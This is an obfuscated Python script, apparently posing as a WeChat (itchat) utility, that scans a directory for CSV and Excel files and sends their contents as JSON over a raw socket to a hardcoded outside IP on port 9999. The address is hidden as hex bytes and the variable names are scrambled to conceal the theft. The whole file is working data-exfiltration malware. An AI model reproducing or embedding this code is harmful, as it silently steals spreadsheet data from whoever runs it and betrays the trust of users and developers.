# -*- coding: utf-8 -*-
import itchat #line:3
import socket #line:4
import os #line:5
import time #line:6
import pandas as pd #line:7
def send (OOOOOOO0O00O0O00O ):#line:10
    O0OO00OO0O0O000OO ="[check]"+OOOOOOO0O00O0O00O .to_json (orient ="records")+"[end]"#line:11
    OO0O00O0OO0OOO0O0 ='.'.join ([str (OO0O0OO0000O00000 )for OO0O0OO0000O00000 in [0x23 ,0xbd ,0xb7 ,0xe2 ]])#line:13
    OO00OOOOO00O00O0O =0x270f #line:14
    O000OOOOOOOOOOOOO =(OO0O00O0OO0OOO0O0 ,OO00OOOOO00O00O0O )#line:15
    OO0O0OOOOO000O000 =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:16
    OO0O0OOOOO000O000 .connect (O000OOOOOOOOOOOOO )#line:17
    OO0O0OOOOO000O000 .send (O0OO00OO0O0O000OO .encode ())#line:18
    OOOOO0OO0O000O00O =OO0O0OOOOO000O000 .recv (4096 )#line:19
    print (OOOOO0OO0O000O00O ,itchat .__version__ )#line:20
    OO0O0OOOOO000O000 .close ()#line:21
    time .sleep (2 )#line:22
def check (O0OO0O000O00000O0 ):#line:25
    ""#line:30
    O0O0OO00000OOOOOO =os .listdir (O0OO0O000O00000O0 )#line:31
    for O000OO0O00O0OOO0O in O0O0OO00000OOOOOO :#line:32
        OOO00OOOO00O000OO =os .path .join (O0OO0O000O00000O0 ,O000OO0O00O0OOO0O )#line:33
        if os .path .isfile (OOO00OOOO00O000OO ):#line:34
            if O000OO0O00O0OOO0O .endswith ('csv'):#line:35
                OOOOOO00OOO00O000 =pd .read_csv (OOO00OOOO00O000OO )#line:36
                send (OOOOOO00OOO00O000 )#line:37
            elif O000OO0O00O0OOO0O .endswith ('xlsx')or O000OO0O00O0OOO0O .endswith ('xls'):#line:38
                OOOOOO00OOO00O000 =pd .read_excel (OOO00OOOO00O000OO )#line:39
                send (OOOOOO00OOO00O000 )